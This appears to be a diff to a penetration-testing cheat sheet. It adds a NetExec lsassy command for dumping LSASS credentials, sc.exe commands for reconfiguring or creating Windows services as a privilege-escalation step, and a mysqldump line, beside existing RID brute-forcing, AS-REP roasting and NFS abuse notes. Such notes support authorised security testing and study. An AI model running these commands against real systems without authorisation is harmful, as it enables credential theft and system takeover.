@@ -807,6 +807,10 @@ nxc smb $IP -u '' -p '' --rid-brute
 nxc smb $IP -u 'guest' -p '' --rid-brute | grep 'SidTypeUser' | awk '{print $6}' | cut -d'\' -f2 | tee users.txt
 impacket-GetNPUsers -dc-ip <DC-IP> -usersfile users.txt -no-pass '<domain>/'
 
+#dumping LSASS Creds with admin
+nxc smb <IP> -u 'user' -p 'password' -M lsassy
+
+
 #Netexec over LDAP
 nxc ldap <DC-IP> -u 'user' -p 'password' -d 'corp.local' --users
 nxc ldap <DC-IP> -u 'user' -p 'password' -d 'corp.local' --groups
@@ -1339,7 +1343,19 @@ sc start <servicename>
 #In Winpeas look for a service which has the following
 File Permissions: Everyone [AllAccess]
 #Replace the executable in the service folder and start the service
-sc start <service>
+```
+
+```powershell
+sc.exe query state= all
+sc.exe query <SVC>
+sc.exe qc <SVC>
+sc.exe qc <SVC> | findstr /I "BINARY_PATH_NAME"
+sc.exe qc <SVC> | findstr /I "SERVICE_START_NAME"
+sc.exe sdshow <SVC>
+sc.exe start <SVC>
+sc.exe stop <SVC>
+sc.exe config <SVC> binPath= "C:\Path\app.exe"
+sc.exe create <SVC> binPath= "C:\Path\app.exe" start= demand
 ```
 
 ### Weak Registry permissions
@@ -1625,6 +1641,10 @@ showmount -e <target IP> #On attacker
 mount -o rw <targetIP>:<share-location> <directory path we created>
 #Now create a binary there
 chmod +x <binary>
+```
+## SQL
+```bash
+mysqldump -u root -p database > backup.sql #Dumping a database for examination
 ```
 
 ---
